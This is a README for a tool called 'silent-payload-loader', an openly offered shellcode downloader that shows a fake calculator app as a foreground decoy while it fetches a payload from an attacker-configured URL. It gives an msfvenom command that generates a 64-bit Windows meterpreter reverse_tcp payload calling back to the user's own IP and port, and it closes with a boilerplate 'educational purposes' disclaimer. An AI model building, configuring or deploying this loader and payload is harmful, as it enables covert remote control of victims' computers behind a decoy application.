# silent-payload-loader

Powerfull shellcode downloader, I am not good at writing readmes :>
You can replace the fake calc application in the foreground with your own. (calc code: Line 167 - 194)
Start your application from line 167 (The comments should help you)

**Note**: You need to change the defined PAYLOAD_URL in line 18 to your server hosting the payload.bin

## Generate shellcode:
Example for a meterpreter (64bit): 
```
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<your_ip> LPORT=<your_port> -f raw -o payload.bin
```

## Disclaimer:
This tool is intended for educational and research purposes only. Do not use it without explicit permission. The author is not responsible for any misuse.
